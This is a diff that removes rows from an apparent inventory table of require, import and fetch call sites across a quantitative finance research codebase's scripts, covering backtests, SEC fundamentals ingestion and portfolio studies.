-| scripts/quant/build-quant-radar.mjs | require(join(ROOT, "quant/engines/radar-event-quarantine.js")) |
-| scripts/quant/build-quant-radar.mjs | require(join(ROOT, "quant/app/view-model.js")) |
-| scripts/quant/build-sec-quant-panel.mjs | require(join(root, "core", "identity.js")) |
-| scripts/quant/build-sec-quant-panel.mjs | require(join(engines, "schema.js")) |
-| scripts/quant/build-sec-quant-panel.mjs | require(join(engines, "factors.js")) |
-| scripts/quant/build-sec-quant-panel.mjs | require(join(engines, "sec-fact-panel.js")) |
-| scripts/quant/build-sec-quant-panel.mjs | require(join(engines, "panel-builder.js")) |
-| scripts/quant/build-sec-quant-panel.mjs | require(join(engines, "published-close.js")) |
-| scripts/quant/build-sec-quant-panel.mjs | require(join(root, "providers", "sec", "adapter.js")) |
-| scripts/quant/build-setup-backtest.mjs | require(join(ROOT, "quant/engines/signal-backtest.js")) |
-| scripts/quant/build-setup-backtest.mjs | require(join(ROOT, "quant/engines/canonical-total-return.js")).VERSION |
-| scripts/quant/build-setup-observations.mjs | require(join(ROOT, "quant/engines/setup-engine.js")) |
-| scripts/quant/build-setup-observations.mjs | require(join(ROOT, "quant/engines/catalog.js")) |
-| scripts/quant/build-setup-outcomes.mjs | require(join(ROOT, "quant/engines/signal-backtest.js")) |
-| scripts/quant/build-sic-peer-taxonomy.mjs | require(join(root, "quant", "engines", "sic-peer-taxonomy.js")) |
-| scripts/quant/build-signal-backtest.mjs | require(join(ROOT, "quant/engines/signal-backtest.js")) |
-| scripts/quant/build-signal-backtest.mjs | require(join(ROOT, "quant/engines/market-quality.js")) |
-| scripts/quant/build-signal-backtest.mjs | require(join(ROOT, "quant/engines/canonical-total-return.js")) |
-| scripts/quant/build-strategy-index.mjs | require(join(ROOT, "quant/engines/strategy-match.js")) |
-| scripts/quant/build-strategy-index.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| scripts/quant/build-survivorship-control.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/quant/build-survivorship-control.mjs | require(join(ROOT, "quant/engines/survivorship-control.js")) |
-| scripts/quant/build-survivorship-control.mjs | require(join(ROOT, "quant/engines/market-quality.js")) |
-| scripts/quant/build-survivorship-control.mjs | require(join(ROOT, "quant/engines/canonical-total-return.js")) |
-| scripts/quant/build-survivorship-control.mjs | require(join(ROOT, "quant/engines/history-store.js")) |
-| scripts/quant/build-survivorship-control.mjs | require(join(ROOT, "quant/engines/zero-cost-guard.js")) |
-| scripts/quant/build-survivorship-control.mjs | import(join(ROOT, "scripts/market/storage/s3-driver.mjs")) |
-| scripts/quant/cli.py | import (aggregate_coverage, build_consumer_bundle, read_history_shards, write_history_shards, load_fiscal_year_end_hints, |
-| scripts/quant/lib/daily-prices.mjs | require(join(ROOT, "quant/engines/technical/canonical-bars.js")) |
-| scripts/quant/lib/daily-prices.mjs | require(join(ROOT, "quant/engines/market-quality.js")) |
-| scripts/quant/lib/daily-prices.mjs | require(join(ROOT, "quant/engines/canonical-total-return.js")) |
-| scripts/quant/lib/daily-prices.mjs | require(join(ROOT, "quant/engines/survivorship-control.js")) |
-| scripts/quant/lib/emerging-leaders-inputs.mjs | require(join(ROOT, "quant/engines/return-series.js")) |
-| scripts/quant/lib/emerging-leaders-inputs.mjs | require(join(ROOT, "quant/engines/pit-fundamental-history.js")) |
-| scripts/quant/lib/emerging-leaders-inputs.mjs | require(join(ROOT, "core/identity.js")) |
-| scripts/quant/lib/emerging-leaders-inputs.mjs | require(join(ROOT, "discover/engines/scoring.js")) |
-| scripts/quant/lib/pattern-study.mjs | require(join(ROOT, "quant/engines/pattern-research.js")) |
-| scripts/quant/measure-backtest-certification.mjs | require(P("quant/engines/backtest-certification.js")) |
-| scripts/quant/measure-backtest-certification.mjs | require(P("quant/engines/signal-backtest.js")) |
-| scripts/quant/measure-backtest-certification.mjs | require(P("quant/engines/quant-radar.js")) |
-| scripts/quant/measure-backtest-signal-intelligence.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| scripts/quant/measure-backtest-signal-intelligence.mjs | require(join(ROOT, "quant/engines/signal-backtest.js")) |
-| scripts/quant/measure-backtest-signal-intelligence.mjs | require(join(ROOT, "quant/engines/quant-radar.js")) |
-| scripts/quant/measure-backtest-signal-intelligence.mjs | require(join(ROOT, "quant/engines/display-policy.js")), queryEngine: require(join(ROOT, "quant/engines/query.js")) |
-| scripts/quant/measure-decision-intelligence.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| scripts/quant/measure-decision-intelligence.mjs | require(join(ROOT, "quant/engines/display-policy.js")), queryEngine: require(join(ROOT, "quant/engines/query.js")) |
-| scripts/quant/measure-local-coverage-levers.mjs | require(join(ROOT, "quant/engines/fundamental-inputs.js")) |
-| scripts/quant/measure-methodology-change.mjs | require(join(ROOT, "quant/engines/return-basis-comparison.js")) |
-| scripts/quant/measure-name-type-evidence.mjs | require(join(ROOT, "quant/engines/instrument-classification.js")) |
-| scripts/quant/measure-naming-contract.mjs | require(join(ROOT, "quant/engines/company-naming-contract.js")) |
-| scripts/quant/measure-naming-contract.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| scripts/quant/measure-naming-contract.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| scripts/quant/measure-naming-contract.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| scripts/quant/measure-pipeline-freshness.mjs | require(join(ROOT, "quant/engines/realtime/trading-session.js")) |
-| scripts/quant/measure-security-type-safety.mjs | require(join(ROOT, "quant/engines/instrument-classification.js")) |
-| scripts/quant/measure-security-type-safety.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
-| scripts/quant/portfolio/model-depots.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) |
-| scripts/quant/portfolio/model-depots.cjs | require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) |
-| scripts/quant/portfolio/model-depots.cjs | require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) |
-| scripts/quant/portfolio/model-depots.cjs | require(path.join(ROOT, 'quant/engines/published-close.js')) |
-| scripts/quant/portfolio/model-depots.cjs | require(path.join(ROOT, 'core/identity.js')) |
-| scripts/quant/portfolio/model-portfolios.cjs | require(path.join(ROOT, 'quant/engines/return-series.js')) |
-| scripts/quant/portfolio/model-portfolios.cjs | require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) |
-| scripts/quant/portfolio/model-portfolios.cjs | require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) |
-| scripts/quant/portfolio/model-portfolios.cjs | require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) |
-| scripts/quant/portfolio/model-portfolios.cjs | require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) |
-| scripts/quant/portfolio/model-portfolios.cjs | require(path.join(ROOT, 'quant/engines/portfolio-risk.cjs')) |
-| scripts/quant/portfolio/model-portfolios.cjs | require(path.join(ROOT, 'quant/engines/research-delisted-series.cjs')) |
-| scripts/quant/refresh-real-backtest.cjs | require() cache. |
-| scripts/quant/replay-setup-history.mjs | require(join(ROOT, "quant/engines/technical/technical-analysis.js")) |
-| scripts/quant/replay-setup-history.mjs | require(join(ROOT, "quant/engines/technical/canonical-bars.js")) |
-| scripts/quant/replay-setup-history.mjs | require(join(ROOT, "quant/engines/setup-engine.js")) |
-| scripts/quant/research/backtest-coverage-matrix.cjs | require(path.join(ROOT, p)) |
-| scripts/quant/research/backtest-runner.cjs | require(path.join(ROOT, p)) |
-| scripts/quant/research/backtest-spec-builder.cjs | require(path.join(ROOT, 'quant/engines/signal-backtest.js')) |
-| scripts/quant/research/backtest-spec-builder.cjs | require(path.join(ROOT, 'scripts/quant/v10/factor/factors.cjs')) |
-| scripts/quant/research/backtest-spec-builder.cjs | require(path.join(ROOT, 'quant/engines/backtest-kinds.cjs')) |
-| scripts/quant/research/pit-snapshot-integrity.cjs | require(P('quant/engines/profile-backtest.js')) |
-| scripts/quant/run-sec-gates.mjs | require(path.join(ROOT, "quant", "engines", "gate-tests.js")) |
-| scripts/quant/run-sec-gates.mjs | require(path.join(ROOT, "providers", "sec", "adapter.js")) |
-| scripts/quant/sec/derived.py | import (     NormalizedFact, Provenance, SOURCE_DERIVED, TRANSFORM_FORMULA, |
-| scripts/quant/sec/normalize.py | import (     Provenance, SOURCE_SEC, TRANSFORM_NONE, QUALITY_HIGH, QUALITY_MEDIUM, |
-| scripts/quant/sec/periods.py | import (     NormalizedFact, Provenance, SOURCE_SEC, TRANSFORM_NONE, TRANSFORM_YTD_DIFF, |
-| scripts/quant/sec/persist-fundamentals.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| scripts/quant/sec/persist-fundamentals.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) |
-| scripts/quant/sec/persist-fundamentals.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| scripts/quant/sec/reconciliation.py | import (DEPTH_YEARS, IN_PRODUCT, REPORT_METRICS, |
-| scripts/quant/tests/test_derived.py | import (     SOURCE_DERIVED, SOURCE_SEC, TRANSFORM_FORMULA, CompanyProfile, |
-| scripts/quant/tests/test_http_and_provider.py | import (     DiskCache, RateLimiter, SECHTTPError, SECHttpClient, |
-| scripts/quant/tests/test_http_and_provider.py | import (     SECProvider, TickerNotFound, normalize_cik, PERIODIC_FORMS, |
-| scripts/quant/tests/test_normalize_periods.py | import (     TRANSFORM_YTD_DIFF, TRANSFORM_FY_MINUS_YTD, TRANSFORM_NONE, TRANSFORM_SUM, |
-| scripts/quant/tests/test_pipeline_and_store.py | import (     IngestionPipeline, STATUS_FAILED, STATUS_INGESTED, STATUS_UNCHANGED, |
-| scripts/quant/tests/test_restatements.py | import (     CompanyFactBook, FactTimeline, Observation, POLICY_AS_OF_LATEST, |
-| scripts/quant/tests/test_secpit_v9_corrections.py | import (     FiscalCalendar, REJECTED_IMPLAUSIBLE_FILING_FY, REJECTED_LABEL_NOT_INCREASING, |
-| scripts/quant/tests/test_secpit_v9_corrections.py | import (     ISSUE_FUTURE_PERIOD_END, build_availability_map, normalize_company, |
-| scripts/quant/tests/test_universe_resolution.py | import (_canonical_ticker, _declared_tickers, _load_universe, |
-| scripts/quant/v10/corporate-actions/before-after.cjs | require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v10/corporate-actions/before-after.cjs | require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v10/corporate-actions/build-ca-registry.cjs | require(path.join(root, 'quant/engines/corporate-action-evidence.js')) |
-| scripts/quant/v10/corporate-actions/run-tr-ledger.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/quant/v10/corporate-actions/run-tr-ledger.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v10/corporate-actions/run-tr-ledger.cjs | require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) |
-| scripts/quant/v10/corporate-actions/run-tr-ledger.cjs | require(path.join(ROOT, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v10/factor/common.cjs | require(ROOT + '/quant/engines/research-weekly-loader.cjs') |
-| scripts/quant/v10/factor/common.cjs | require(ROOT + '/quant/engines/weekly-benchmark.cjs') |
-| scripts/quant/v10/factor/common.cjs | require(ROOT + '/quant/engines/research-contract.cjs') |
-| scripts/quant/v10/factor/factors.cjs | require(ROOT + '/quant/engines/factor-evidence.js') |
-| scripts/quant/v10/factor/factors.cjs | require(ROOT + '/quant/engines/fundamental-inputs.js') |
-| scripts/quant/v10/factor/factors.cjs | require(ROOT + '/quant/engines/market-cap.js') |
-| scripts/quant/v10/factor/factors.cjs | require(ROOT + '/quant/engines/return-series.js') |
-| scripts/quant/v10/factor/factors.cjs | require(ROOT + '/quant/methodology/quant-v2.json') |
-| scripts/quant/v10/factor/strategy.cjs | require(F.ROOT + '/quant/engines/research-portfolio.cjs') |
-| scripts/quant/v10/factor/strategy.cjs | require(F.ROOT + '/quant/engines/research-validation.cjs') |
-| scripts/quant/v10/factor/study.cjs | require(F.ROOT + '/quant/engines/research-studies.cjs') |
-| scripts/quant/v10/factor/study.cjs | require(F.ROOT + '/quant/engines/research-validation.cjs') |
-| scripts/quant/v10/factor/study.cjs | require(F.ROOT + '/scripts/quant/v9/sensitivity/dependence.cjs') |
-| scripts/quant/v10/population/b1_identity.py | fetch(cik, f, prefix): |
-| scripts/quant/v10/population/b1_identity.py | fetch(cik, f, ANNUAL_PREFIX) |
-| scripts/quant/v10/population/b1_identity.py | fetch(cik, f, ANNUAL_PREFIX if f['form'] in ANNUAL else OTHER_PREFIX) |
-| scripts/quant/v10/population/before-after.cjs | require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v10/population/before-after.cjs | require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v10/population/build-registers.cjs | require(file))) |
-| scripts/quant/v10/population/build-registers.cjs | require(file)) above does not see it, so it is carried over verbatim (correction after the independent V12 review, LARGECAP m9). |
-| scripts/quant/v10/population/reasons.cjs | require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v10/population/reasons.cjs | require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v10/setup/build-setup-independence-decision.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v10/setup/run-setup-reconstruction.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v10/setup/run-setup-reconstruction.cjs | require(path.join(ROOT, 'quant/engines/research-studies.cjs')) |
-| scripts/quant/v10/setup/run-setup-reconstruction.cjs | require(path.join(ROOT, 'quant/engines/research-validation.cjs')) |
-| scripts/quant/v10/setup/run-setup-reconstruction.cjs | require(path.join(ROOT, 'quant/engines/weekly-benchmark.cjs')) |
-| scripts/quant/v10/setup/run-setup-reconstruction.cjs | require(path.join(ROOT, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v10/setup/setup-original-inventory.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | import(join(ROOT, "scripts/quant/replay-setup-history.mjs")) |
-| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | require(join(ROOT, "quant/engines/technical/technical-analysis.js")) |
-| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | require(join(ROOT, "quant/engines/technical/canonical-bars.js")) |
-| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | require(join(ROOT, "quant/engines/setup-engine.js")) |
-| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | require(join(ROOT, "quant/engines/research-weekly-loader.cjs")) |
-| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | require(join(ROOT, "quant/engines/research-contract.cjs")) |
-| scripts/quant/v10/studies/common.cjs | require(ROOT + '/quant/engines/research-contract.cjs') |
-| scripts/quant/v10/studies/common.cjs | require(ROOT + '/quant/engines/research-weekly-loader.cjs') |
-| scripts/quant/v10/studies/common.cjs | require(ROOT + '/quant/engines/research-studies.cjs') |
-| scripts/quant/v10/studies/common.cjs | require(ROOT + '/quant/engines/research-validation.cjs') |
-| scripts/quant/v10/studies/common.cjs | require(ROOT + '/quant/engines/weekly-benchmark.cjs') |
-| scripts/quant/v10/studies/common.cjs | require(ROOT + '/quant/engines/signal-backtest.js') |
-| scripts/quant/v10/studies/pattern-study.cjs | require(K.ROOT + '/quant/engines/pattern-research.js') |
-| scripts/quant/v10/studies/signal-study.cjs | require(K.ROOT + '/quant/engines/research-portfolio.cjs') |
-| scripts/quant/v11/decomposition/portfolio.cjs | require(K.ROOT + '/quant/engines/research-portfolio.cjs') |
-| scripts/quant/v11/decomposition/register.cjs | require(ROOT + '/quant/engines/research-validation.cjs') |
-| scripts/quant/v11/discovery/lib.cjs | require(ROOT + '/scripts/quant/v10/studies/common.cjs') |
-| scripts/quant/v11/discovery/lib.cjs | require(ROOT + '/quant/engines/research-portfolio.cjs') |
-| scripts/quant/v11/discovery/lib.cjs | require(ROOT + '/quant/engines/research-validation.cjs') |
-| scripts/quant/v11/discovery/lib.cjs | require(ROOT + '/quant/engines/research-contract.cjs') |
-| scripts/quant/v11/winners/build.cjs | require(K.ROOT + '/quant/engines/fundamental-inputs.js').compute(v.doc, cutoff, W.finite(mc.value) ? mc.value : null) |
-| scripts/quant/v11/winners/registration.cjs | require(ROOT + '/quant/engines/research-validation.cjs') |
-| scripts/quant/v12/indexpop/build-outputs.cjs | require(path.join(ROOT, 'quant/engines/return-series.js')) |
-| scripts/quant/v12/indexpop/map-members.cjs | require(path.join(ROOT, 'core/identity.js')) |
-| scripts/quant/v12/indexpop/map-members.cjs | require(path.join(ROOT, 'quant/engines/return-series.js')) |
-| scripts/quant/v12/indexpop/qualify.cjs | require(path.join(ROOT, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v12/indexpop/run-pipeline.sh | fetch (inventory.py, fetch_docs.py, fates.py fetch separately). |
-| scripts/quant/v12/largecap/export-ca-frame.cjs | require(path.join(root, 'quant/engines/corporate-action-evidence.js')) |
-| scripts/quant/v12/largecap/export-ca-frame.cjs | require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v12/largecap/qualify-sets.cjs | require(path.join(ROOT, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v12/mcap/classify.cjs | require(ROOT + '/quant/engines/research-pit-market-cap.cjs') |
-| scripts/quant/v12/mcap/panel.cjs | require(F.ROOT + '/quant/engines/research-pit-market-cap.cjs') |
-| scripts/quant/v12/mcap/review-correction.cjs | require(path.join(ROOT, 'scripts/quant/v10/factor/panel.cjs')) |
-| scripts/quant/v12/mcap/winners-preload.cjs | require(ROOT + '/scripts/quant/v10/studies/common.cjs') |
-| scripts/quant/v12/mcap/winners-preload.cjs | require(ROOT + '/scripts/quant/v10/factor/factors.cjs') |
-| scripts/quant/v12/mcap/winners-preload.cjs | require(ROOT + '/scripts/quant/v10/factor/common.cjs') |
-| scripts/quant/v12/mcap/winners-preload.cjs | require(ROOT + '/quant/engines/research-pit-market-cap.cjs') |
-| scripts/quant/v12/requal/lib.cjs | require(ROOT + '/quant/engines/research-index-population.cjs') |
-| scripts/quant/v12/requal/lib.cjs | require(ROOT + '/quant/engines/research-listing-lifecycle.cjs').records, cases = [] |
-| scripts/quant/v12/requal/p5a-population.cjs | require(L.ROOT + '/scripts/quant/v10/studies/common.cjs') |
-| scripts/quant/v12/requal/p5b-signals.cjs | require(L.ROOT + '/scripts/quant/v10/studies/common.cjs') |
-| scripts/quant/v12/requal/p5b-signals.cjs | require(o.p5a), p5aSha = L.shaFile(o.p5a) |
-| scripts/quant/v12/requal/p5b-signals.cjs | require(L.ROOT + '/docs/quant-recovery/v11/decomposition/decomposition-results.json').A1_decomposition.cells |
-| scripts/quant/v12/requal/p5c-factor.cjs | require(L.ROOT + '/scripts/quant/v10/factor/factors.cjs') |
-| scripts/quant/v12/requal/p5c-factor.cjs | require(L.ROOT + '/docs/quant-recovery/v10/factor/factor-study-1.0.0.json').table |
-| scripts/quant/v12/requal/p5d-attribution.cjs | require(D('p5a-population-1.1.0.json')), b = require(D('p5b-signals-1.1.0.json')), c = require(D('p5c-factor-1.1.0.json')), s = require(D('p6-strategies-1.1.0.json')) |
-| scripts/quant/v12/requal/p6-strategies.cjs | require(o.p5a) |
-| scripts/quant/v12/spxpop/build-population.cjs | require(path.join(ROOT, 'scripts/quant/v12/indexpop/lib.cjs')) |
-| scripts/quant/v12/spxpop/build-population.cjs | require(path.join(ROOT, 'quant/engines/research-index-population.cjs')) |
-| scripts/quant/v12/spxpop/build-population.cjs | require(path.join(ROOT, 'quant/engines/return-series.js')) |
-| scripts/quant/v12/spxpop/build-population.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v12/spxpop/build-population.cjs | require(path.join(ROOT, 'quant/engines/research-pit-market-cap.cjs')) |
-| scripts/quant/v12/spxpop/build-population.cjs | require(path.join(ROOT, 'quant/engines/research-listing-lifecycle.cjs')).records |
-| scripts/quant/v13/largecap/evaluate.cjs | require(path.join(ROOT, 'quant/engines/corporate-action-evidence.js')) |
-| scripts/quant/v13/largecap/evaluate.cjs | require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v13/studies/lib.cjs | require(ROOT + '/scripts/quant/v10/studies/common.cjs') |
-| scripts/quant/v13/studies/run-frame.cjs | require(W.ROOT + '/quant/engines/research-delisted-series.cjs') |
-| scripts/quant/v13/studies/run-frame.cjs | require(W.ROOT + '/scripts/quant/v10/studies/signal-study.cjs') |
-| scripts/quant/v13/studies/run-s3.cjs | require(W.ROOT + '/scripts/quant/v12/requal/lib.cjs') |
-| scripts/quant/v13/studies/run-s3.cjs | require(W.ROOT + '/scripts/quant/v12/requal/p5a-population.cjs') |
-| scripts/quant/v13/studies/run-s3.cjs | require(W.ROOT + '/quant/engines/research-delisted-series.cjs') |
-| scripts/quant/v13/studies/run-s3.cjs | require(W.ROOT + '/scripts/quant/v12/requal/plan.cjs') |
-| scripts/quant/v13b/f1w/run.cjs | require(W.ROOT + '/quant/engines/research-delisted-series.cjs') |
-| scripts/quant/v13b/f1w/run.cjs | require(W.ROOT + '/scripts/quant/v10/studies/signal-study.cjs') |
-| scripts/quant/v13b/f1w/run.cjs | require(W.ROOT + '/scripts/quant/v13/studies/run-frame.cjs') |
-| scripts/quant/v13b/largecap-strict/evaluate-1.1.0.cjs | require(path.join(ROOT, 'scripts/quant/v13/largecap/evaluate.cjs')) |
-| scripts/quant/v13b/largecap-strict/evaluate-1.1.0.cjs | require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v13c/lib.cjs | require(W.ROOT + '/quant/engines/research-delisted-series.cjs') |
-| scripts/quant/v13c/run-frame.cjs | require(W.ROOT + '/scripts/quant/v10/studies/signal-study.cjs') |
-| scripts/quant/v13c/run-frame.cjs | require(W.ROOT + '/scripts/quant/v13/studies/run-frame.cjs') |
-| scripts/quant/v13c/run-s3.cjs | require(W.ROOT + '/scripts/quant/v12/requal/lib.cjs') |
-| scripts/quant/v13c/run-s3.cjs | require(W.ROOT + '/scripts/quant/v12/requal/p5a-population.cjs') |
-| scripts/quant/v13c/run-s3.cjs | require(W.ROOT + '/scripts/quant/v13/studies/run-s3.cjs') |
-| scripts/quant/v13c/run-s3.cjs | require(W.ROOT + '/scripts/quant/v12/requal/plan.cjs') |
-| scripts/quant/v9-followups/ca-registry/before-after.cjs | require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v9-followups/ca-registry/before-after.cjs | require(path.join(root, 'quant/engines/research-ca-evidence.cjs')) |
-| scripts/quant/v9-followups/ca-registry/export-frame.cjs | require(path.join(root, 'quant/engines/corporate-action-evidence.js')) |
-| scripts/quant/v9-followups/ca-registry/export-frame.cjs | require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v9-followups/ca-registry/export-frame.cjs | require(path.join(root, 'quant/engines/research-identity-evidence.cjs')) |
-| scripts/quant/v9-followups/identity/before-after.cjs | require(enginePath) |
-| scripts/quant/v9-followups/identity/before-after.cjs | require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) |
-| scripts/quant/v9-followups/identity/before-after.cjs | require(path.join(root, 'quant/engines/research-identity-evidence.cjs')) |
-| scripts/quant/v9-followups/ledger/build_before_after.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v9-followups/ledger/build_before_after.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/quant/v9-followups/ledger/build_before_after.cjs | require(path.resolve(arg('old-engine'))) |
-| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) |
-| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | require(path.join(ROOT, 'quant/engines/return-series.js')) |
-| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | require(path.resolve(arg('old-engine'))) |
-| scripts/quant/v9-followups/ledger/v8_node_shim.cjs | require(path.resolve(process.env.ENGINE)) |
-| scripts/quant/v9/corporate-actions/proposal_dryrun.cjs | require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v9/corporate-actions/proposal_dryrun.cjs | require(path.join(ROOT, 'quant/engines/corporate-action-evidence.js')) |
-| scripts/quant/v9/corporate-actions/triage.cjs | require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v9/corporate-actions/triage.cjs | require(path.join(ROOT, 'quant/engines/corporate-action-evidence.js')) |
-| scripts/quant/v9/events/harvest_8k_items.py | fetch(out): |
-| scripts/quant/v9/events/harvest_8k_items.py | fetch(o) if a.phase == 'fetch' else parse(o) |
-| scripts/quant/v9/events/population.cjs | require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v9/events/run-v9-events.cjs | require(path.join(ROOT, 'quant/engines/research-studies.cjs')) |
-| scripts/quant/v9/events/run-v9-events.cjs | require(path.join(ROOT, 'quant/engines/research-validation.cjs')) |
-| scripts/quant/v9/events/run-v9-events.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v9/events/run-v9-events.cjs | require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) |
-| scripts/quant/v9/identity/dry-run-qualification.cjs | require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v9/identity/reproduce-weekly-reasons.cjs | require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) |
-| scripts/quant/v9/portfolio/run_ledger.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/quant/v9/portfolio/run_ledger.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v9/portfolio/run_ledger.cjs | require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) |
-| scripts/quant/v9/portfolio/run_ledger.cjs | require(path.join(ROOT, 'quant/engines/return-series.js')) |
-| scripts/quant/v9/portfolio/run_terminal_ledger.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/quant/v9/portfolio/run_terminal_ledger.cjs | require(path.join(ROOT, 'quant/engines/research-contract.cjs')) |
-| scripts/quant/v9/portfolio/run_terminal_ledger.cjs | require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) |
-| scripts/quant/v9/secpit/impact.mjs | require(join(ROOT, "quant/engines/fundamental-inputs.js")) |
-| scripts/quant/v9/secpit/impact.mjs | require(join(ROOT, "quant/engines/pit-fundamental-history.js")) |
-| scripts/quant/v9/sensitivity/run-v9-sensitivity.cjs | require(ROOT + '/quant/engines/research-contract.cjs'), A = require(ROOT + '/quant/engines/weekly-real-adapter.cjs') |
-| scripts/quant/v9/sensitivity/run-v9-sensitivity.cjs | require(ROOT + '/quant/engines/research-studies.cjs'), V = require(ROOT + '/quant/engines/research-validation.cjs'), B = require(ROOT + '/quant/engines/weekly-benchmark |
-| scripts/quant/v9_followups/sec_pipeline/before-after.mjs | require(join(ROOT, "quant/engines/fundamental-inputs.js")) |
-| scripts/quant/v9_followups/sec_pipeline/before-after.mjs | require(join(ROOT, "quant/engines/market-cap.js")) |
-| scripts/quant/v9_followups/sec_pipeline/verify_quarantine_detection.py | require(process.argv[1]) |
-| scripts/quant/verify-golden-five-backtest-readiness.mjs | require(join(root, "core", "identity.js")) |
-| scripts/quant/verify-golden-five-backtest-readiness.mjs | require(join(root, "providers", "sec", "adapter.js")) |
-| scripts/research/edge/edge-quant.test.cjs | require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) |
-| scripts/research/edge/quant-e3.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/research/edge/quant-e3.cjs | require(path.join(ROOT, 'quant/engines/backtest-metrics.cjs')) |
-| scripts/research/edge/quant-e3.cjs | require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) |
-| scripts/research/edge/quant-e3.cjs | require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) |
-| scripts/research/edge/quant-e3.cjs | require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) |
-| scripts/research/edge/run-e3.cjs | require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) |
-| scripts/research/edge/run-e3.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) |
-| scripts/research/edge/run-e3.cjs | require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) |
-| scripts/research/edge/st-e3.cjs | require(path.resolve(__dirname, '../../../quant/engines/portfolio-construction.cjs')) |
-| scripts/research/edge2/blind.cjs | require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) |
-| scripts/research/edge2/blind.cjs | require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) |
-| scripts/research/edge2/blind.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/research/edge2/dna.cjs | require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) |
-| scripts/research/edge2/dna.cjs | require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) |
